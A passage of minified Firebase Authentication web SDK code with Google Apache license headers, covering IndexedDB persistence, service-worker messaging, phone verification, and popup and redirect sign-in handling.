class Pe{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){let t=this.receivers.find((t=>t.isListeningto(e)));if(t)return t;let n=new Pe(e);return this.receivers.push(n),n}isListeningto(e){return this.eventTarget===e}async handleEvent(e){let{eventId:t,eventType:n,data:r}=e.data,i=this.handlersMap[n];if(!(null==i?void 0:i.size))return;e.ports[0].postMessage({status:"ack",eventId:t,eventType:n});let s=Array.from(i).map((async t=>t(e.origin,r))),a=await Promise.all(s.map((async e=>{try{return{fulfilled:!0,value:await e}}catch(e){return{fulfilled:!1,reason:e}}})));e.ports[0].postMessage({status:"done",eventId:t,eventType:n,response:a})}_subscribe(e,t){0===Object.keys(this.handlersMap).length&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(t)}_unsubscribe(e,t){this.handlersMap[e]&&t&&this.handlersMap[e].delete(t),t&&0!==this.handlersMap[e].size||delete this.handlersMap[e],0===Object.keys(this.handlersMap).length&&this.eventTarget.removeEventListener("message",this.boundEventHandler)
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}function Le(e="",t=10){let n="";for(let e=0;e<t;e++)n+=Math.floor(10*Math.random());return e+n}Pe.receivers=[];
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Me{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,t,n=50){let r,i,s="undefined"!=typeof MessageChannel?new MessageChannel:null;if(!s)throw Error("connection_unavailable");return new Promise(((a,o)=>{let l=Le("",20);s.port1.start();let u=setTimeout((()=>{o(Error("unsupported_event"))}),n);i={messageChannel:s,onMessage(e){if(e.data.eventId===l)switch(e.data.status){case"ack":clearTimeout(u),r=setTimeout((()=>{o(Error("timeout"))}),3e3);break;case"done":clearTimeout(r),a(e.data.response);break;default:clearTimeout(u),clearTimeout(r),o(Error("invalid_response"))}}},this.handlers.add(i),s.port1.addEventListener("message",i.onMessage),this.target.postMessage({eventType:e,eventId:l,data:t},[s.port2])})).finally((()=>{i&&this.removeMessageHandler(i)}))}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Fe(){return window}
/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ue(){return void 0!==Fe().WorkerGlobalScope&&"function"==typeof Fe().importScripts}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let Ve="firebaseLocalStorageDb",je="firebaseLocalStorage",Be="fbase_key";class qe{constructor(e){this.request=e}toPromise(){return new Promise(((e,t)=>{this.request.addEventListener("success",(()=>{e(this.request.result)})),this.request.addEventListener("error",(()=>{t(this.request.error)}))}))}}function $e(e,t){return e.transaction([je],t?"readwrite":"readonly").objectStore(je)}function ze(){let e=indexedDB.open(Ve,1);return new Promise(((t,n)=>{e.addEventListener("error",(()=>{n(e.error)})),e.addEventListener("upgradeneeded",(()=>{let t=e.result;try{t.createObjectStore(je,{keyPath:Be})}catch(e){n(e)}})),e.addEventListener("success",(async()=>{let n=e.result;n.objectStoreNames.contains(je)?t(n):(n.close(),await function(){let e=indexedDB.deleteDatabase(Ve);return new qe(e).toPromise()}(),t(await ze()))}))}))}async function Ge(e,t,n){let r=$e(e,!0).put({[Be]:t,value:n});return new qe(r).toPromise()}function Ke(e,t){let n=$e(e,!0).delete(t);return new qe(n).toPromise()}class He{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then((()=>{}),(()=>{}))}async _openDb(){return this.db||(this.db=await ze()),this.db}async _withRetries(e){let t=0;for(;;)try{let t=await this._openDb();return await e(t)}catch(e){if(t++>3)throw e;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return Ue()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=Pe._getInstance(Ue()?self:null),this.receiver._subscribe("keyChanged",(async(e,t)=>({keyProcessed:(await this._poll()).includes(t.key)}))),this.receiver._subscribe("ping",(async(e,t)=>["keyChanged"]))}async initializeSender(){var e,t;if(this.activeServiceWorker=await async function(){if(!(null==navigator?void 0:navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch(e){return null}}(),!this.activeServiceWorker)return;this.sender=new Me(this.activeServiceWorker);let n=await this.sender._send("ping",{},800);n&&(null===(e=n[0])||void 0===e?void 0:e.fulfilled)&&(null===(t=n[0])||void 0===t?void 0:t.value.includes("keyChanged"))&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){var t;if(this.sender&&this.activeServiceWorker&&((null===(t=null==navigator?void 0:navigator.serviceWorker)||void 0===t?void 0:t.controller)||null)===this.activeServiceWorker)try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch(e){}}async _isAvailable(){try{if(!indexedDB)return!1;let e=await ze();return await Ge(e,Oe,"1"),await Ke(e,Oe),!0}catch(e){}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,t){return this._withPendingWrite((async()=>(await this._withRetries((n=>Ge(n,e,t))),this.localCache[e]=t,this.notifyServiceWorker(e))))}async _get(e){let t=await this._withRetries((t=>async function(e,t){let n=$e(e,!1).get(t),r=await new qe(n).toPromise();return void 0===r?null:r.value}(t,e)));return this.localCache[e]=t,t}async _remove(e){return this._withPendingWrite((async()=>(await this._withRetries((t=>Ke(t,e))),delete this.localCache[e],this.notifyServiceWorker(e))))}async _poll(){let e=await this._withRetries((e=>{let t=$e(e,!1).getAll();return new qe(t).toPromise()}));if(!e||0!==this.pendingWrites)return[];let t=[],n=new Set;for(let{fbase_key:r,value:i}of e)n.add(r),JSON.stringify(this.localCache[r])!==JSON.stringify(i)&&(this.notifyListeners(r,i),t.push(r));for(let e of Object.keys(this.localCache))this.localCache[e]&&!n.has(e)&&(this.notifyListeners(e,null),t.push(e));return t}notifyListeners(e,t){this.localCache[e]=t;let n=this.listeners[e];if(n)for(let e of Array.from(n))e(t)}startPolling(){this.stopPolling(),this.pollTimer=setInterval((async()=>this._poll()),800)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,t){0===Object.keys(this.listeners).length&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),0===this.listeners[e].size&&delete this.listeners[e]),0===Object.keys(this.listeners).length&&this.stopPolling()}}function We(e){return`__${e}${Math.floor(1e6*Math.random())}`}async function Qe(e,t,n){var r,i,s;let a=await n.verify();try{let o;if(g("string"==typeof a,e,"argument-error"),g("recaptcha"===n.type,e,"argument-error"),o="string"==typeof t?{phoneNumber:t}:t,"session"in o){let t=o.session;if("phoneNumber"in o){return g("enroll"===t.type,e,"internal-error"),(await(i={idToken:t.credential,phoneEnrollmentInfo:{phoneNumber:o.phoneNumber,recaptchaToken:a}},C(e,"POST","/v2/accounts/mfaEnrollment:start",A(e,i)))).phoneSessionInfo.sessionInfo}{g("signin"===t.type,e,"internal-error");let n=(null===(r=o.multiFactorHint)||void 0===r?void 0:r.uid)||o.multiFactorUid;return g(n,e,"missing-multi-factor-info"),(await(s={mfaPendingCredential:t.credential,mfaEnrollmentId:n,phoneSignInInfo:{recaptchaToken:a}},C(e,"POST","/v2/accounts/mfaSignIn:start",A(e,s)))).phoneResponseInfo.sessionInfo}}{let{sessionInfo:t}=await async function(e,t){return C(e,"POST","/v1/accounts:sendVerificationCode",A(e,t))}(e,{phoneNumber:o.phoneNumber,recaptchaToken:a});return t}}finally{n._reset()}}He.type="LOCAL",We("rcb"),new I(3e4,6e4);
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Je{constructor(e){this.providerId=Je.PROVIDER_ID,this.auth=oe(e)}verifyPhoneNumber(e,t){return Qe(this.auth,e,(0,i.m9)(t))}static credential(e,t){return ge._fromVerification(e,t)}static credentialFromResult(e){return Je.credentialFromTaggedObject(e)}static credentialFromError(e){return Je.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;let{phoneNumber:t,temporaryProof:n}=e;return t&&n?ge._fromTokenResponse(t,n):null}}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Xe(e,t){return t?w(t):(g(e._popupRedirectResolver,e,"argument-error"),e._popupRedirectResolver)}Je.PROVIDER_ID="phone",Je.PHONE_SIGN_IN_METHOD="phone";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ye extends he{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return fe(e,this._buildIdpRequest())}_linkToIdToken(e,t){return fe(e,this._buildIdpRequest(t))}_getReauthenticationResolver(e){return fe(e,this._buildIdpRequest())}_buildIdpRequest(e){let t={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(t.idToken=e),t}}function Ze(e){
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */return async function(e,t,n=!1){let r="signIn",i=await Ce(e,r,t),s=await Se._fromIdTokenResponse(e,r,i);return n||await e._updateCurrentUser(s.user),s}(e.auth,new Ye(e),e.bypassAuthState)}function et(e){let{auth:t,user:n}=e;return g(n,t,"internal-error"),
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
async function(e,t,n=!1){let{auth:r}=e,i="reauthenticate";try{let s=await F(e,Ce(r,i,t,e),n);g(s.idToken,r,"internal-error");let a=M(s.idToken);g(a,r,"internal-error");let{sub:o}=a;return g(e.uid===o,r,"user-mismatch"),Se._forOperation(e,i,s)}catch(e){throw"auth/user-not-found"===(null==e?void 0:e.code)&&d(r,"user-mismatch"),e}}(n,new Ye(e),e.bypassAuthState)}async function tt(e){let{auth:t,user:n}=e;return g(n,t,"internal-error"),async function(e,t,n=!1){let r=await F(e,t._linkToIdToken(e.auth,await e.getIdToken()),n);return Se._forOperation(e,"link",r)}(n,new Ye(e),e.bypassAuthState)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nt{constructor(e,t,n,r,i=!1){this.auth=e,this.resolver=n,this.user=r,this.bypassAuthState=i,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(t)?t:[t]}execute(){return new Promise((async(e,t)=>{this.pendingPromise={resolve:e,reject:t};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(e){this.reject(e)}}))}async onAuthEvent(e){let{urlResponse:t,sessionId:n,postBody:r,tenantId:i,error:s,type:a}=e;if(s)return void this.reject(s);let o={auth:this.auth,requestUri:t,sessionId:n,tenantId:i||void 0,postBody:r||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(a)(o))}catch(e){this.reject(e)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return Ze;case"linkViaPopup":case"linkViaRedirect":return tt;case"reauthViaPopup":case"reauthViaRedirect":return et;default:d(this.auth,"internal-error")}}resolve(e){this.pendingPromise||y("Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){this.pendingPromise||y("Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}let rt=new I(2e3,1e4);async function it(e,t,n){let r=oe(e);!function(e,t,n){if(!(t instanceof n))throw n.name!==t.constructor.name&&d(e,"argument-error"),p(e,"argument-error",`Type of ${t.constructor.name} does not match expected instance.Did you pass a reference from a different Auth SDK?`)}(e,t,we);let i=Xe(r,n);return new st(r,"signInViaPopup",t,i).executeNotNull()}class st extends nt{constructor(e,t,n,r,i){super(e,t,r,i),this.provider=n,this.authWindow=null,this.pollId=null,st.currentPopupAction&&st.currentPopupAction.cancel(),st.currentPopupAction=this}async executeNotNull(){let e=await this.execute();return g(e,this.auth,"internal-error"),e}async onExecution(){1===this.filter.length||y("Popup operations only handle one event");let e=Le();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch((e=>{this.reject(e)})),this.resolver._isIframeWebStorageSupported(this.auth,(e=>{e||this.reject(f(this.auth,"web-storage-unsupported"))})),this.pollUserCancellation()}get eventId(){var e;return(null===(e=this.authWindow)||void 0===e?void 0:e.associatedEvent)||null}cancel(){this.reject(f(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,st.currentPopupAction=null}pollUserCancellation(){let e=()=>{var t,n;(null===(n=null===(t=this.authWindow)||void 0===t?void 0:t.window)||void 0===n?void 0:n.closed)?this.pollId=window.setTimeout((()=>{this.pollId=null,this.reject(f(this.auth,"popup-closed-by-user"))}),2e3):this.pollId=window.setTimeout(e,rt.get())};e()}}st.currentPopupAction=null;let at=new Map;class ot extends nt{constructor(e,t,n=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],t,void 0,n),this.eventId=null}async execute(){let e=at.get(this.auth._key());if(!e){try{let t=await async function(e,t){let n=K("pendingRedirect",t.config.apiKey,t.name),r=w(e._redirectPersistence);if(!await r._isAvailable())return!1;let i="true"===await r._get(n);return await r._remove(n),i}(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(t)}catch(t){e=()=>Promise.reject(t)}at.set(this.auth._key(),e)}return this.bypassAuthState||at.set(this.auth._key(),(()=>Promise.resolve(null))),e()}async onAuthEvent(e){if("signInViaRedirect"===e.type)return super.onAuthEvent(e);if("unknown"!==e.type){if(e.eventId){let t=await this.auth._redirectUserForId(e.eventId);if(t)return this.user=t,super.onAuthEvent(e);this.resolve(null)}}else this.resolve(null)}async onExecution(){}cleanUp(){}}function lt(e,t){at.set(e._key(),t)}async function ut(e,t,n=!1){let r=oe(e),i=Xe(r,t),s=new ot(r,i,n),a=await s.execute();return a&&!n&&(delete a.user._redirectEventId,await r._persistUserIfCurrent(a.user),await r._setRedirectUser(null,t)),a}class ct{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let t=!1;return this.consumers.forEach((n=>{this.isEventForConsumer(e,n)&&(t=!0,this.sendToConsumer(e,n),this.saveEventToCache(e))})),this.hasHandledPotentialRedirect||!function(e){switch(e.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return dt(e);default:return!1}}(e)||(this.hasHandledPotentialRedirect=!0,t||(this.queuedRedirectEvent=e,t=!0)),t}sendToConsumer(e,t){var n;if(e.error&&!dt(e)){let r=(null===(n=e.error.code)||void 0===n?void 0:n.split("auth/")[1])||"internal-error";t.onError(f(this.auth,r))}else t.onAuthEvent(e)}isEventForConsumer(e,t){let n=null===t.eventId||!!e.eventId&&e.eventId===t.eventId;return t.filter.includes(e.type)&&n}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=6e5&&this.cachedEventUids.clear(),this.cachedEventUids.has(ht(e))}saveEventToCache(e){this.cachedEventUids.add(ht(e)),this.lastProcessedEventTime=Date.now()}}function ht(e){return[e.type,e.eventId,e.sessionId,e.tenantId].filter((e=>e)).join("-")}function dt({type:e,error:t}){return"unknown"===e&&"auth/no-auth-event"===(null==t?void 0:t.code)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let ft=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,pt=/^https?/;async function mt(e){if(e.config.emulator)return;let{authorizedDomains:t}=await async function(e,t={}){return C(e,"GET","/v1/projects",t)}(e);for(let n of t)try{if(function(e){let t=b(),{protocol:n,hostname:r}=new URL(t);if(e.startsWith("chrome-extension://")){let i=new URL(e);return""===i.hostname&&""===r?"chrome-extension:"===n&&e.replace("chrome-extension://","")===t.replace("chrome-extension://",""):"chrome-extension:"===n&&i.hostname===r}if(!pt.test(n))return!1;if(ft.test(e))return r===e;let i=e.replace(/\./g,"\\.");return RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}(n))return}catch(e){}d(e,"unauthorized-domain")}
/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let gt=new I(3e4,6e4);function yt(){let e=Fe().___jsl;if(null==e?void 0:e.H)for(let t of Object.keys(e.H))if(e.H[t].r=e.H[t].r||[],e.H[t].L=e.H[t].L||[],e.H[t].r=[...e.H[t].L],e.CP)for(let t=0;t<e.CP.length;t++)e.CP[t]=null}let vt=null,wt=new I(5e3,15e3),bt={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},_t=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);
/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let It={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"};class Et{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch(e){}}}function Tt(e,t,n,r,a,o){g(e.config.authDomain,e,"auth-domain-config-required"),g(e.config.apiKey,e,"invalid-api-key");let l={apiKey:e.config.apiKey,appName:e.name,authType:n,redirectUrl:r,v:s.Jn,eventId:a};if(t instanceof we)for(let[n,r]of(t.setDefaultLanguage(e.languageCode),l.providerId=t.providerId||"",(0,i.xb)(t.getCustomParameters())||(l.customParameters=JSON.stringify(t.getCustomParameters())),Object.entries(o||{})))l[n]=r;if(t instanceof be){let e=t.getScopes().filter((e=>""!==e));e.length>0&&(l.scopes=e.join(","))}e.tenantId&&(l.tid=e.tenantId);let u=l;for(let e of Object.keys(u))void 0===u[e]&&delete u[e];return`${function({config:e}){return e.emulator?E(e,"emulator/auth/handler"):`https://${e.authDomain}/__/auth/handler`}(e)}?${(0,i.xO)(u).slice(1)}`
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}let St="webStorageSupport",kt=class{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=xe,this._completeRedirectFn=ut,this._overrideRedirectResult=lt}async _openPopup(e,t,n,r){var s;return(null===(s=this.eventManagers[e._key()])||void 0===s?void 0:s.manager)||y("_initialize() not called before _openPopup()"),function(e,t,n,r=500,s=600){let a=Math.max((window.screen.availHeight-s)/2,0).toString(),o=Math.max((window.screen.availWidth-r)/2,0).toString(),l="",u=Object.assign(Object.assign({},It),{width:r.toString(),height:s.toString(),top:a,left:o}),c=(0,i.z$)().toLowerCase();n&&(l=X(c)?"_blank":n),Q(c)&&(t=t||"http://localhost",u.scrollbars="yes");let h=Object.entries(u).reduce(((e,[t,n])=>`${e}${t}=${n},`),"");if(function(e=(0,i.z$)()){var t;return ne(e)&&!!(null===(t=window.navigator)||void 0===t?void 0:t.standalone)}(c)&&"_self"!==l)return function(e,t){let n=document.createElement("a");n.href=e,n.target=t;let r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),n.dispatchEvent(r)}(t||"",l),new Et(null);let d=window.open(t||"",l,h);g(d,e,"popup-blocked");try{d.focus()}catch(e){}return new Et(d)}(e,Tt(e,t,n,b(),r),Le())}async _openRedirect(e,t,n,r){var i;return await this._originValidation(e),i=Tt(e,t,n,b(),r),Fe().location.href=i,new Promise((()=>{}))}_initialize(e){let t=e._key();if(this.eventManagers[t]){let{manager:e,promise:n}=this.eventManagers[t];return e?Promise.resolve(e):(n||y("If manager is not set, promise should be"),n)}let n=this.initAndGetManager(e);return this.eventManagers[t]={promise:n},n.catch((()=>{delete this.eventManagers[t]})),n}async initAndGetManager(e){let t=await async function(e){let t=await(vt=vt||new Promise(((t,n)=>{var r,i,s,a;function o(){yt(),gapi.load("gapi.iframes",{callback:()=>{t(gapi.iframes.getContext())},ontimeout:()=>{yt(),n(f(e,"network-request-failed"))},timeout:gt.get()})}if(null===(i=null===(r=Fe().gapi)||void 0===r?void 0:r.iframes)||void 0===i?void 0:i.Iframe)t(gapi.iframes.getContext());else{if(!(null===(s=Fe().gapi)||void 0===s?void 0:s.load)){let t=We("iframefcb");return Fe()[t]=()=>{gapi.load?o():n(f(e,"network-request-failed"))},(a=`https://apis.google.com/js/api.js?onload=${t}`,new Promise(((e,t)=>{var n,r;let i=document.createElement("script");i.setAttribute("src",a),i.onload=e,i.onerror=e=>{let n=f("internal-error");n.customData=e,t(n)},i.type="text/javascript",i.charset="UTF-8",(null!==(r=null===(n=document.getElementsByTagName("head"))||void 0===n?void 0:n[0])&&void 0!==r?r:document).appendChild(i)}))).catch((e=>n(e)))}o()}})).catch((e=>{throw vt=null,e}))),n=Fe().gapi;return g(n,e,"internal-error"),t.open({where:document.body,url:function(e){let t=e.config;g(t.authDomain,e,"auth-domain-config-required");let n=t.emulator?E(t,"emulator/auth/iframe"):`https://${e.config.authDomain}/__/auth/iframe`,r={apiKey:t.apiKey,appName:e.name,v:s.Jn},a=_t.get(e.config.apiHost);a&&(r.eid=a);let o=e._getFrameworks();return o.length&&(r.fw=o.join(",")),`${n}?${(0,i.xO)(r).slice(1)}`}(e),messageHandlersFilter:n.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:bt,dontclear:!0},(t=>new Promise((async(n,r)=>{await t.restyle({setHideOnLeave:!1});let i=f(e,"network-request-failed"),s=Fe().setTimeout((()=>{r(i)}),wt.get());function a(){Fe().clearTimeout(s),n(t)}t.ping(a).then(a,(()=>{r(i)}))}))))}(e),n=new ct(e);return t.register("authEvent",(t=>(g(null==t?void 